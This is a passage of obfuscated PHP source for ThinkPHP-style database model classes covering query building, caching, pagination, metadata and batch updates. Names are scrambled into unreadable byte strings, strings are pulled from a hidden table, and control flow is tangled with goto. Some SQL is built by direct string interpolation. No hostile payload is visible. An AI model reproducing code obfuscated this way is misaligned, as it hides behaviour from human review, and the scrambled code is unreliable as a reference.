($cÁÔÀšªÅ == $_SERVER[¶ªÕß‚ØÁŸ][343]) { return $this->name; } $this->name = substr($cÁÔÀšªÅ, 0, -5); } return $this->name; } public function getTableName() { $a×î¾»¢® =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($this->trueTableName)) { $e¬±“Ò¬‡â = !empty($this->tablePrefix) ? $this->tablePrefix : $a×î¾»¢®[33]; if (!empty($this->tableName)) { $e¬±“Ò¬‡â .= $this->tableName; } else { $e¬±“Ò¬‡â .= think_parse_name($this->name); } $this->trueTableName = strtolower($e¬±“Ò¬‡â); } return (!empty($this->dbName) ? $this->dbName . $a×î¾»¢®[101] : $a×î¾»¢®[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fî²áßíß =& $_SERVER[¶ªÕß‚ØÁŸ]; return isset($this->fields[$fî²áßíß[248]]) ? $this->fields[$fî²áßíß[248]] : $this->pk; } public function getDbFields() { $D‹…İÚ§£ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($this->options[$D‹…İÚ§£[276]])) { $F©¡¤œÇÆ = $this->db->getFields($this->options[$D‹…İÚ§£[276]]); return $F©¡¤œÇÆ ? array_keys($F©¡¤œÇÆ) : !1; } if ($this->fields) { $F©¡¤œÇÆ = $this->fields; unset($F©¡¤œÇÆ[$D‹…İÚ§£[247]], $F©¡¤œÇÆ[$D‹…İÚ§£[248]], $F©¡¤œÇÆ[$D‹…İÚ§£[249]], $F©¡¤œÇÆ[$D‹…İÚ§£[246]]); return $F©¡¤œÇÆ; } return !1; } public function data($e…·ê’´‡Ï = '') { $cá¥…ƒš =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cá¥…ƒš[33] === $e…·ê’´‡Ï && !empty($this->data)) { return $this->data; } if (is_object($e…·ê’´‡Ï)) { $e…·ê’´‡Ï = get_object_vars($e…·ê’´‡Ï); } elseif (is_string($e…·ê’´‡Ï)) { parse_str($e…·ê’´‡Ï, $e…·ê’´‡Ï); } elseif (!is_array($e…·ê’´‡Ï)) { think_exception(think_lang($cá¥…ƒš[268])); } $this->data = $e…·ê’´‡Ï; return $this; } public function join($bË÷×˜Èø£) { $a²¡ïÂìÏ– =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($bË÷×˜Èø£)) { $this->options[$a²¡ïÂìÏ–[279]] = $bË÷×˜Èø£; } elseif (!empty($bË÷×˜Èø£)) { $this->options[$a²¡ïÂìÏ–[279]][] = $bË÷×˜Èø£; } return $this; } public function union($fÆÑïŠ½‚, $aè“ÉÍ™Şæ = false) { goto d“Ö‡öµ—¯; d£Éğ°Š¡: if (is_object($fÆÑïŠ½‚)) { $fÆÑïŠ½‚ = get_object_vars($fÆÑïŠ½‚); } if (is_string($fÆÑïŠ½‚)) { $a¡Íø†ˆ‘’ = $fÆÑïŠ½‚; } elseif (is_array($fÆÑïŠ½‚)) { if (isset($fÆÑïŠ½‚[0])) { $this->options[$F©Ò½¤õ™[344]] = array_merge($this->options[$F©Ò½¤õ™[344]], $fÆÑïŠ½‚); return $this; } else { $a¡Íø†ˆ‘’ = $fÆÑïŠ½‚; } } else { think_exception(think_lang($F©Ò½¤õ™[268])); } $this->options[$F©Ò½¤õ™[344]][] = $a¡Íø†ˆ‘’; goto eÏ½ÚÏ¼Ú; eÏ½ÚÏ¼Ú: return $this; goto E¿ÛÄ°’µ; d“Ö‡öµ—¯: $F©Ò½¤õ™ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($fÆÑïŠ½‚)) { return $this; } if ($aè“ÉÍ™Şæ) { $this->options[$F©Ò½¤õ™[344]][$F©Ò½¤õ™[345]] = !0; } goto d£Éğ°Š¡; E¿ÛÄ°’µ: } public function cache($F¯™ò°Û£˜ = true, $CÅ Â•òä = null, $Dö“Ó²‹‚ = '') { $aÙß£¨å =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!1 !== $F¯™ò°Û£˜) { $this->options[$aÙß£¨å[346]] = array($aÙß£¨å[99] => $F¯™ò°Û£˜, $aÙß£¨å[336] => $CÅ Â•òä, $aÙß£¨å[29] => $Dö“Ó²‹‚); } return $this; } public function field($D¯³”ôª‚, $d‹Ùñ±ŸÃÂ = false) { $Eé©œ†åçŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!0 === $D¯³”ôª‚) { $cæªñèÑö§ = $this->getDbFields(); $D¯³”ôª‚ = $cæªñèÑö§ ? $cæªñèÑö§ : $Eé©œ†åçŒ[186]; } elseif ($d‹Ùñ±ŸÃÂ) { if (is_string($D¯³”ôª‚)) { $D¯³”ôª‚ = explode($Eé©œ†åçŒ[47], $D¯³”ôª‚); } $cæªñèÑö§ = $this->getDbFields(); $D¯³”ôª‚ = $cæªñèÑö§ ? array_diff($cæªñèÑö§, $D¯³”ôª‚) : $D¯³”ôª‚; } $this->options[$Eé©œ†åçŒ[270]] = $D¯³”ôª‚; return $this; } public function scope($F¹ÁÍÎ†Ê‡ = '', $a·×°Ã¶ã = NULL) { $fÌË×‘…¿» =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($fÌË×‘…¿»[33] === $F¹ÁÍÎ†Ê‡) { if (isset($this->_scope[$fÌË×‘…¿»[34]])) { $C‚ã·¡é§÷ = $this->_scope[$fÌË×‘…¿»[34]]; } else { return $this; } } elseif (is_string($F¹ÁÍÎ†Ê‡)) { $Fİ‹ÀèÏŸ˜ = explode($fÌË×‘…¿»[47], $F¹ÁÍÎ†Ê‡); $C‚ã·¡é§÷ = array(); foreach ($Fİ‹ÀèÏŸ˜ as $fØ¹ï¶ªÈ•) { if (!isset($this->_scope[$fØ¹ï¶ªÈ•])) { continue; } $C‚ã·¡é§÷ = array_merge($C‚ã·¡é§÷, $this->_scope[$fØ¹ï¶ªÈ•]); } if (!empty($a·×°Ã¶ã) && is_array($a·×°Ã¶ã)) { $C‚ã·¡é§÷ = array_merge($C‚ã·¡é§÷, $a·×°Ã¶ã); } } elseif (is_array($F¹ÁÍÎ†Ê‡)) { $C‚ã·¡é§÷ = $F¹ÁÍÎ†Ê‡; } if (is_array($C‚ã·¡é§÷) && !empty($C‚ã·¡é§÷)) { $this->options = array_merge($this->options, array_change_key_case($C‚ã·¡é§÷)); } return $this; } public function where($BÒ§“à¿™, $D¸•§­Ïö° = null) { $b™¢¼²Æ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_null($D¸•§­Ïö°) && is_string($BÒ§“à¿™)) { if (!is_array($D¸•§­Ïö°)) { $D¸•§­Ïö° = func_get_args(); array_shift($D¸•§­Ïö°); } $D¸•§­Ïö° = array_map(array($this->db, $b™¢¼²Æ[340]), $D¸•§­Ïö°); $BÒ§“à¿™ = vsprintf($BÒ§“à¿™, $D¸•§­Ïö°); } elseif (is_object($BÒ§“à¿™)) { $BÒ§“à¿™ = get_object_vars($BÒ§“à¿™); } elseif (is_array($BÒ§“à¿™)) { foreach ($BÒ§“à¿™ as $C›Û¸‰ö“Œ => $AÇï©Èª’) { if ((is_numeric($C›Û¸‰ö“Œ) || !$C›Û¸‰ö“Œ) && is_string($AÇï©Èª’)) { think_trace($b™¢¼²Æ[347], $b™¢¼²Æ[33], $b™¢¼²Æ[46]); die; } } } if (is_string($BÒ§“à¿™) && $b™¢¼²Æ[33] != $BÒ§“à¿™) { $eª½ÍòŒÔç = array(); $eª½ÍòŒÔç[$b™¢¼²Æ[348]] = $BÒ§“à¿™; $BÒ§“à¿™ = $eª½ÍòŒÔç; } if (isset($this->options[$b™¢¼²Æ[272]])) { $this->options[$b™¢¼²Æ[272]] = array_merge($this->options[$b™¢¼²Æ[272]], $BÒ§“à¿™); } else { $this->options[$b™¢¼²Æ[272]] = $BÒ§“à¿™; } return $this; } public function limit($CÔœ„ÕÓâ, $EõË÷‡›ë = null) { $DìŞÀŞØµ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->options[$DìŞÀŞØµ[289]] = is_null($EõË÷‡›ë) ? $CÔœ„ÕÓâ : $CÔœ„ÕÓâ . $DìŞÀŞØµ[47] . $EõË÷‡›ë; return $this; } public function page($cò ÷—Ğ·§, $CÛ©ÔÑš = null) { $Cå®÷·‹ìË =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->options[$Cå®÷·‹ìË[349]] = is_null($CÛ©ÔÑš) ? $cò ÷—Ğ·§ : $cò ÷—Ğ·§ . $Cå®÷·‹ìË[47] . $CÛ©ÔÑš; return $this; } public function comment($e²áª»Åó) { $this->options[$_SERVER[¶ªÕß‚ØÁŸ][350]] = $e²áª»Åó; return $this; } public function setProperty($AÃˆ¤¬ïç÷, $BœÜ“ÉÓ²Í) { if (property_exists($this, $AÃˆ¤¬ïç÷)) { $this->{$AÃˆ¤¬ïç÷} = $BœÜ“ÉÓ²Í; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\124\151\155\145", "\164\x69\155\x65", "\x69\x6e\163\145\162\164\54\165\x70\144\141\164\145", "\x66\x75\156\143\x74\x69\157\x6e"), array("\143\162\x65\141\164\x65\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\145\x72\x74", "\146\165\x6e\143\164\x69\x6f\156")); public function setDataAuto($d•¬‘Àèİ) { $this->dataAuto = $d•¬‘Àèİ; } public function __construct($aŸÙÉÂÂŞ¸ = '', $C…··Íò¹È = '', $CŞÂ¿çç¢÷ = '') { parent::__construct($aŸÙÉÂÂŞ¸, $C…··Íò¹È, $CŞÂ¿çç¢÷); } public static function textEncode($EéÜÑ¿Ñï) { if (!$EéÜÑ¿Ñï) { return $EéÜÑ¿Ñï; } $Fº„¤¥˜–Ï = json_encode($EéÜÑ¿Ñï); $Fº„¤¥˜–Ï = preg_replace_callback($_SERVER[¶ªÕß‚ØÁŸ][351], function ($EÆ¤‡‹ŞË¾) { return addslashes($EÆ¤‡‹ŞË¾[0]); }, $Fº„¤¥˜–Ï); return json_decode($Fº„¤¥˜–Ï); } public static function textDecode($e–óàÃÛ) { $e˜ØÈàò–á =& $_SERVER[¶ªÕß‚ØÁŸ]; $EĞĞ’äî—‚ = json_encode($e–óàÃÛ); $EĞĞ’äî—‚ = preg_replace_callback($e˜ØÈàò–á[352], function ($a¼ŠÉç’×ó) { return $_SERVER[¶ªÕß‚ØÁŸ][103]; }, $EĞĞ’äî—‚); return json_decode($EĞĞ’äî—‚); } protected $tableMeta = array(); protected function _beforeInsert(&$eÅ‡Á–„á, $a‚‘ŠÏ©…¹) { $d·†çô‰î =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->checkDataAutoHas($d·†çô‰î[353])) { return; } $this->dataBeforeFilter($eÅ‡Á–„á, $d·†çô‰î[353]); } protected function _beforeUpdate(&$b“ãÂ†œ‰å, $C®‰µ‚ëœÙ) { $a†ÓÓœ‘Ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->checkDataAutoHas($a†ÓÓœ‘Ñ[354])) { return; } $this->dataBeforeFilter($b“ãÂ†œ‰å, $a†ÓÓœ‘Ñ[354]); } protected function _afterSelect(&$fäÕµ¯À£ã, $Cïì‚Öô½˜) { if (!is_array($fäÕµ¯À£ã)) { return; } if (!$this->checkDataAutoHas($_SERVER[¶ªÕß‚ØÁŸ][355])) { return; } foreach ($fäÕµ¯À£ã as &$D¼ãøƒÎÈ) { $this->dataAfterFilter($D¼ãøƒÎÈ); } } protected function _afterFind(&$b§…ÕÜ÷±‡, $C×ÑªÅÖÕö) { if (!is_array($b§…ÕÜ÷±‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[¶ªÕß‚ØÁŸ][355])) { return; } $this->dataAfterFilter($b§…ÕÜ÷±‡); } public function setAutoIncrement($D·‚âµ‰„´) { $Bòƒ‘Á×  = array($this->getPk() => $D·‚âµ‰„´); $dæ’ó¹¥’ = $this->data($Bòƒ‘Á× )->add(); if ($dæ’ó¹¥’) { $this->delete($dæ’ó¹¥’); } } public function getAutoIncrement() { $f„ï•ÔÍÒ = $this->getTableName(); $eãŠïå® = $this->max($this->getPk()); $EÉóÁËºç” = $this->query("\163\x68\x6f\x77\x20\164\x61\x62\154\145\40\x73\x74\141\x74\x75\x73\40\167\150\x65\x72\x65\x20\116\x61\155\x65\75\x27{$f„ï•ÔÍÒ}\47"); $A–ëƒõöÄ– = $EÉóÁËºç”[0][$_SERVER[¶ªÕß‚ØÁŸ][356]]; $eæößƒã· = max($eãŠïå®, $A–ëƒõöÄ–); return $eæößƒã·; } protected function _callBefore($C¤“Ã†ôÎ³, $côô¢ß‡°÷) { return $this->cacheCallCheck($C¤“Ã†ôÎ³, $côô¢ß‡°÷, !1); } protected function _callAfter($fØã±•‹“, $f¥Ğ×øæó) { return $this->cacheCallCheck($fØã±•‹“, $f¥Ğ×øæó, !0); } protected function cacheFunctionAlias($fßÏÊ·ç…°) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($A¸Êõòœ’ô, $B©îù‹ÅÊ, $Cä¬¥©‚ˆ¼ = false) { $Cõ˜é¿­Ç = $this->cacheFunctionAlias($B©îù‹ÅÊ); if (!$Cõ˜é¿­Ç) { return; } foreach ($Cõ˜é¿­Ç as $b¨éÎˆãÑŠ => $C¼œÆÕ–Ú) { $a¨ïØ»Æ„ = $C¼œÆÕ–Ú[0]; $FªÇ‰Ş·ª  = explode($_SERVER[¶ªÕß‚ØÁŸ][47], $C¼œÆÕ–Ú[1]); if ($A¸Êõòœ’ô == $b¨éÎˆãÑŠ) { return $this->cacheFunctionGet($b¨éÎˆãÑŠ, $a¨ïØ»Æ„); } if ($Cä¬¥©‚ˆ¼ && in_array($A¸Êõòœ’ô, $FªÇ‰Ş·ª )) { $this->cacheFunctionClear($b¨éÎˆãÑŠ, $a¨ïØ»Æ„); } } } public function cacheFunctionGet($e­ôÓ›‚Ñ›, $C‘±«Ï…¥Ù) { $b˜¼²ÂâÑ = $this->cacheKeyMake($e­ôÓ›‚Ñ›, $C‘±«Ï…¥Ù); $Dï†õ‡³ = Cache::get($b˜¼²ÂâÑ); if (!is_array($Dï†õ‡³)) { $Dï†õ‡³ = call_user_func_array(array($this, $e­ôÓ›‚Ñ›), array($C‘±«Ï…¥Ù, !0)); Cache::set($b˜¼²ÂâÑ, $Dï†õ‡³); } return $Dï†õ‡³; } public function cacheFunctionClear($Bø¶“‡Ê÷ğ, $eŒµêáäØó) { $C­¾š²¨Äè = $eŒµêáäØó; if (!is_array($eŒµêáäØó)) { $C­¾š²¨Äè = array($eŒµêáäØó); } foreach ($C­¾š²¨Äè as $dÏÍÆ…—‡’) { $c¤ƒ¯ÃÌÉî = $this->cacheKeyMake($Bø¶“‡Ê÷ğ, $dÏÍÆ…—‡’); Cache::remove($c¤ƒ¯ÃÌÉî); } } private function cacheKeyMake($B¾ÖÈ‚Ó©Æ, $Bğ«´ƒçÉ) { $bŒ§ÓôØ–Š =& $_SERVER[¶ªÕß‚ØÁŸ]; return get_class($this) . $bŒ§ÓôØ–Š[80] . $B¾ÖÈ‚Ó©Æ . $bŒ§ÓôØ–Š[357] . $Bğ«´ƒçÉ; } protected function selectPage($f­ÔÜïàí = 200, $Añ¯óë¿ŞÑ = 1) { goto D—ğ¤Ìª†; e¤±×ìËå: $cÖÒƒ¥ö×ò = intval($this->count()); $f­ÔÜïàí = intval($f­ÔÜïàí); $f­ÔÜïàí = $f­ÔÜïàí <= 5 ? 5 : ($f­ÔÜïàí >= $EÉ¢Ï‹ ¿ ? $EÉ¢Ï‹ ¿ : $f­ÔÜïàí); goto Aª…×Ü„“Ö; d´ÎŠ‹¢‹¯: $this->optionsValue($aÁé‹Ñ¾ƒø); $CÆ¨Û¦Ë¾– = $this->page($Añ¯óë¿ŞÑ, $f­ÔÜïàí)->select(); $CÆ¨Û¦Ë¾– = is_array($CÆ¨Û¦Ë¾–) ? $CÆ¨Û¦Ë¾– : array(); goto FÚ™¢‰ï«‹; fƒ„¡²¶: $c“ó®é„° = $aÁé‹Ñ¾ƒø; $c“ó®é„°[$f¦´Ø Ğ¥¥[359]] = array(); $this->optionsValue($c“ó®é„°); goto e¤±×ìËå; FÚ™¢‰ï«‹: if ($FêÕ·¨‘ŞÁ == 1) { $cÖÒƒ¥ö×ò = count($CÆ¨Û¦Ë¾–); } $aÎìƒ—¥Ú = array($f¦´Ø Ğ¥¥[360] => array($f¦´Ø Ğ¥¥[361] => $cÖÒƒ¥ö×ò, $f¦´Ø Ğ¥¥[358] => $f­ÔÜïàí, $f¦´Ø Ğ¥¥[349] => $Añ¯óë¿ŞÑ, $f¦´Ø Ğ¥¥[362] => $FêÕ·¨‘ŞÁ), $f¦´Ø Ğ¥¥[363] => $CÆ¨Û¦Ë¾– ? $CÆ¨Û¦Ë¾– : array()); return $aÎìƒ—¥Ú; goto A…ÕÀˆŒ¤ö; Aª…×Ü„“Ö: $FêÕ·¨‘ŞÁ = ceil($cÖÒƒ¥ö×ò / $f­ÔÜïàí); $Añ¯óë¿ŞÑ = intval(isset($in[$f¦´Ø Ğ¥¥[349]]) ? $in[$f¦´Ø Ğ¥¥[349]] : $Añ¯óë¿ŞÑ); $Añ¯óë¿ŞÑ = $Añ¯óë¿ŞÑ <= 1 ? 1 : ($Añ¯óë¿ŞÑ >= $FêÕ·¨‘ŞÁ ? $FêÕ·¨‘ŞÁ : $Añ¯óë¿ŞÑ); goto d´ÎŠ‹¢‹¯; D—ğ¤Ìª†: $f¦´Ø Ğ¥¥ =& $_SERVER[¶ªÕß‚ØÁŸ]; global $in; $aÁé‹Ñ¾ƒø = $this->optionsValue(); goto fŠñá×²”; fŠñá×²”: $EÉ¢Ï‹ ¿ = 4000; $f­ÔÜïàí = isset($in[$f¦´Ø Ğ¥¥[358]]) ? $in[$f¦´Ø Ğ¥¥[358]] : $f­ÔÜïàí; if ($f­ÔÜïàí === -1) { unset($in[$f¦´Ø Ğ¥¥[358]]); $EÉ¢Ï‹ ¿ = 100000000; $f­ÔÜïàí = $EÉ¢Ï‹ ¿; } goto fƒ„¡²¶; A…ÕÀˆŒ¤ö: } protected function checkLength($d½Ø¡¯Í’, $F†¨ì‰ÌŒ = 0, $e“Õ½…‘ˆ› = '') { $DÔ»µÕİÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F†¨ì‰ÌŒ = $F†¨ì‰ÌŒ ? $F†¨ì‰ÌŒ : 65536; if (!$d½Ø¡¯Í’ || strlen($d½Ø¡¯Í’) < $F†¨ì‰ÌŒ) { return; } $e“Õ½…‘ˆ› = $e“Õ½…‘ˆ› ? $e“Õ½…‘ˆ› . $DÔ»µÕİÁ[77] : $DÔ»µÕİÁ[33]; show_json($e“Õ½…‘ˆ› . LNG($DÔ»µÕİÁ[364]) . "\50{$F†¨ì‰ÌŒ}\x29", !1); } protected function metaSet($dÇâˆ«›õğ, $dáŠŒ–…Ë‚ = null, $dÏƒÌ­ôô£ = null) { goto CÊ‰Ì³‘Î•; aŒĞ••ĞéÓ: if (is_string($dáŠŒ–…Ë‚)) { $a²Š±· §•[$dáŠŒ–…Ë‚] = $dÏƒÌ­ôô£; } $a¾‡¨âøÕ¶ = array(); foreach ($a²Š±· §• as $Eá¦ÄÛ‹Òñ => $c»åë‡„Ø¹) { $this->checkLength($c»åë‡„Ø¹, !1, $Eé±¿–øÇ• . $d›”®Î æÚ[4] . $Eá¦ÄÛ‹Òñ); $a¾‡¨âøÕ¶[] = array($dïã­¡¨® => $dÇâˆ«›õğ, $d›”®Î æÚ[99] => $Eá¦ÄÛ‹Òñ, $d›”®Î æÚ[368] => $c»åë‡„Ø¹); } goto aœÑéÇÛ±; Eˆ‡ ó­ÈÄ: if (is_null($dáŠŒ–…Ë‚)) { return $Dõï‡Î¯ï->where(array($dïã­¡¨® => $dÇâˆ«›õğ))->delete(); } if (is_null($dÏƒÌ­ôô£)) { return $Dõï‡Î¯ï->where($C×ÔÈô‘)->delete(); } $a²Š±· §• = is_array($dáŠŒ–…Ë‚) ? $dáŠŒ–…Ë‚ : array(); goto aŒĞ••ĞéÓ; CÊ‰Ì³‘Î•: $d›”®Î æÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->tableMeta) { return !1; } $dïã­¡¨® = $this->tableMeta[$d›”®Î æÚ[365]]; goto dÔ¦ãÁ´ñ­; dÔ¦ãÁ´ñ­: $Eé±¿–øÇ• = $this->tableMeta[$d›”®Î æÚ[366]]; $Dõï‡Î¯ï = Model($Eé±¿–øÇ•); $C×ÔÈô‘ = array($dïã­¡¨® => $dÇâˆ«›õğ, $d›”®Î æÚ[367] => $dáŠŒ–…Ë‚); goto Eˆ‡ ó­ÈÄ; aœÑéÇÛ±: $Dõï‡Î¯ï->where(array($dïã­¡¨® => $dÇâˆ«›õğ))->addAll($a¾‡¨âøÕ¶, array(), !0); return !0; goto có›‚¾àºİ; có›‚¾àºİ: } public function metaGet($f¤¹“¼ë¾) { goto fá…‡ËÊ±ä; Fˆ‚¬Œè : $d„Ÿ‘ö¹Õà = array_to_keyvalue($d„Ÿ‘ö¹Õà, $E’Ë›–­ğ[99], $E’Ë›–­ğ[368]); return $d„Ÿ‘ö¹Õà; goto C‘‹Â‰Ò‰„; f—•…‚†ÊÒ: $A‘…Å’„‰» = Model($this->tableMeta[$E’Ë›–­ğ[366]]); $CÏÍø©ì¾§ = array($cŸÅ’¦ã => $f¤¹“¼ë¾); $d„Ÿ‘ö¹Õà = $A‘…Å’„‰»->field($E’Ë›–­ğ[369])->where($CÏÍø©ì¾§)->select(); goto Fˆ‚¬Œè ; fá…‡ËÊ±ä: $E’Ë›–­ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->tableMeta) { return array(); } $cŸÅ’¦ã = $this->tableMeta[$E’Ë›–­ğ[365]]; goto f—•…‚†ÊÒ; C‘‹Â‰Ò‰„: } private function checkDataAutoHas($A£ÆšÖµ²) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $F¸áªÌß®) { if (in_array($A£ÆšÖµ², explode($_SERVER[¶ªÕß‚ØÁŸ][47], $F¸áªÌß®[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e£éƒÙ‹‰Ù, $Cªœ½¢¸øÍ) { $d»äË‰¿Ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($this->dataAuto as $f™ÀãœŸÒé) { $Aê«¥£Ì× = $f™ÀãœŸÒé[0]; if (!in_array($Cªœ½¢¸øÍ, explode($d»äË‰¿Ñ[47], $f™ÀãœŸÒé[2]))) { continue; } switch (trim($f™ÀãœŸÒé[3])) { case $d»äË‰¿Ñ[318]: case $d»äË‰¿Ñ[319]: $f¥…¬Ÿ×¨Á = $f™ÀãœŸÒé[1]; $dæíöˆõ“À = isset($f™ÀãœŸÒé[4]) ? (array) $f™ÀãœŸÒé[4] : array(); if ($f¥…¬Ÿ×¨Á == $d»äË‰¿Ñ[200] && array_key_exists($Aê«¥£Ì×, $e£éƒÙ‹‰Ù)) { if (!$e£éƒÙ‹‰Ù[$Aê«¥£Ì×]) { unset($e£éƒÙ‹‰Ù[$Aê«¥£Ì×]); } break; } if (isset($e£éƒÙ‹‰Ù[$Aê«¥£Ì×])) { array_unshift($dæíöˆõ“À, $e£éƒÙ‹‰Ù[$Aê«¥£Ì×]); } if ($d»äË‰¿Ñ[318] == $f™ÀãœŸÒé[3]) { $e£éƒÙ‹‰Ù[$Aê«¥£Ì×] = call_user_func_array($f¥…¬Ÿ×¨Á, $dæíöˆõ“À); } else { $e£éƒÙ‹‰Ù[$Aê«¥£Ì×] = call_user_func_array(array(&$this, $f¥…¬Ÿ×¨Á), $dæíöˆõ“À); } break; case $d»äË‰¿Ñ[270]: $e£éƒÙ‹‰Ù[$Aê«¥£Ì×] = $e£éƒÙ‹‰Ù[$f™ÀãœŸÒé[1]]; break; case $d»äË‰¿Ñ[291]: if (isset($e£éƒÙ‹‰Ù[$Aê«¥£Ì×]) && !is_string($e£éƒÙ‹‰Ù[$Aê«¥£Ì×])) { $e£éƒÙ‹‰Ù[$Aê«¥£Ì×] = json_encode_force($e£éƒÙ‹‰Ù[$Aê«¥£Ì×]); } break; case $d»äË‰¿Ñ[320]: if ($e£éƒÙ‹‰Ù[$Aê«¥£Ì×] === $d»äË‰¿Ñ[33]) { unset($e£éƒÙ‹‰Ù[$Aê«¥£Ì×]); } break; case $d»äË‰¿Ñ[321]: $e£éƒÙ‹‰Ù[$Aê«¥£Ì×] = $f™ÀãœŸÒé[1]; default: break; } } if ($Cªœ½¢¸øÍ == $d»äË‰¿Ñ[353]) { $BáêÔÜöˆ = strtolower($this->db->getDbType()); if (strpos($BáêÔÜöˆ, $d»äË‰¿Ñ[9]) !== 0) { return; } $cİìÉ‘éğ = $this->field(!0)->fields; $AÓ´ô¤©Å = $cİìÉ‘éğ[$d»äË‰¿Ñ[249]]; if (isset($cİìÉ‘éğ[$d»äË‰¿Ñ[248]])) { unset($AÓ´ô¤©Å[$cİìÉ‘éğ[$d»äË‰¿Ñ[248]]]); } foreach ($AÓ´ô¤©Å as $B’çÏóëš => $Cªœ½¢¸øÍ) { if (!isset($e£éƒÙ‹‰Ù[$B’çÏóëš])) { $e£éƒÙ‹‰Ù[$B’çÏóëš] = $d»äË‰¿Ñ[33]; } } } } private function dataAfterFilter(&$D‰Í·°Ï‰ß) { $eç ’Ì‹¦ã =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($this->dataAuto as $eÚÙ…Ï³‘†) { $b§Ê²»ùè = $eÚÙ…Ï³‘†[0]; if (!in_array($eç ’Ì‹¦ã[355], explode($eç ’Ì‹¦ã[47], $eÚÙ…Ï³‘†[2]))) { continue; } if (!isset($D‰Í·°Ï‰ß[$b§Ê²»ùè])) { continue; } switch (trim($eÚÙ…Ï³‘†[3])) { case $eç ’Ì‹¦ã[318]: case $eç ’Ì‹¦ã[319]: $b½õâ’à·´ = isset($eÚÙ…Ï³‘†[4]) ? (array) $eÚÙ…Ï³‘†[4] : array(); array_unshift($b½õâ’à·´, $D‰Í·°Ï‰ß[$b§Ê²»ùè]); if ($eç ’Ì‹¦ã[318] == $eÚÙ…Ï³‘†[3]) { $D‰Í·°Ï‰ß[$b§Ê²»ùè] = call_user_func_array($eÚÙ…Ï³‘†[1], $b½õâ’à·´); } else { $D‰Í·°Ï‰ß[$b§Ê²»ùè] = call_user_func_array(array(&$this, $eÚÙ…Ï³‘†[1]), $b½õâ’à·´); } break; case $eç ’Ì‹¦ã[270]: $D‰Í·°Ï‰ß[$b§Ê²»ùè] = $D‰Í·°Ï‰ß[$eÚÙ…Ï³‘†[1]]; break; case $eç ’Ì‹¦ã[291]: $dî›†ÃÖ´Ï = $D‰Í·°Ï‰ß[$b§Ê²»ùè]; $D‰Í·°Ï‰ß[$b§Ê²»ùè] = json_decode($dî›†ÃÖ´Ï, !0); if (is_null($D‰Í·°Ï‰ß[$b§Ê²»ùè])) { $D‰Í·°Ï‰ß[$b§Ê²»ùè] = $dî›†ÃÖ´Ï; } break; case $eç ’Ì‹¦ã[320]: if ($D‰Í·°Ï‰ß[$b§Ê²»ùè] === $eç ’Ì‹¦ã[33]) { unset($D‰Í·°Ï‰ß[$b§Ê²»ùè]); } break; case $eç ’Ì‹¦ã[321]: $D‰Í·°Ï‰ß[$b§Ê²»ùè] = $eÚÙ…Ï³‘†[1]; default: break; } } } public function saveAll($Cì©•Éº£Ô) { goto A¬£á…Ùç; A¬£á…Ùç: $Fé‰Í½£òÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a„‚¨©Ú× = $this->tablePrefix . $this->tableName; $eƒ¦èİ¿ùµ = self::SQL_WHERE_IN_CHUNK; goto fÙñ¡š‘˜æ; F®©õ¿¶‘é: $Eò‘²ù”„ = array(); $EÂß‘ùâñ = count($Cì©•Éº£Ô); for ($dÕ¡¶Èê¼ó = 0; $dÕ¡¶Èê¼ó < $EÂß‘ùâñ; $dÕ¡¶Èê¼ó++) { $e“¾‘¸‘Ç‘ = $Cì©•Éº£Ô[$dÕ¡¶Èê¼ó]; if (!is_array($e“¾‘¸‘Ç‘) || count($e“¾‘¸‘Ç‘) != 4) { continue; } $a³÷áå¥ = "\125\x50\x44\x41\124\105\40{$a„‚¨©Ú×}\x20\123\105\124\x20{$e“¾‘¸‘Ç‘[2]}\x20\75\x20\103\x41\x53\105\40{$e“¾‘¸‘Ç‘[0]}\40\12"; if ($a‘Şğ—¨¼ê == 0) { $fÌ‚¢ÍŠœÁ = $a³÷áå¥; } $Eò‘²ù”„[] = $Fé‰Í½£òÙ[123] . $e“¾‘¸‘Ç‘[1] . $Fé‰Í½£òÙ[123]; $a‘Şğ—¨¼ê++; $fÌ‚¢ÍŠœÁ .= "\40\x57\x48\105\x4e\40\47{$e“¾‘¸‘Ç‘[1]}\47\40\x54\110\105\x4e\40\x27{$e“¾‘¸‘Ç‘[3]}\47\40\12"; if ($a‘Şğ—¨¼ê == $eƒ¦èİ¿ùµ || $dÕ¡¶Èê¼ó == $EÂß‘ùâñ - 1) { goto d«Êñ³Ê; døÊÀ´Æ¾Ã: $a‘Şğ—¨¼ê = 0; $fÌ‚¢ÍŠœÁ = $a³÷áå¥; $this->chunkEventCheck(count($Eò‘²ù”„)); goto aŸ›¾Œ¼Ú¼; d«Êñ³Ê: $aˆª÷ªÌó¹ = implode($Fé‰Í½£òÙ[47], $Eò‘²ù”„); $fÌ‚¢ÍŠœÁ .= 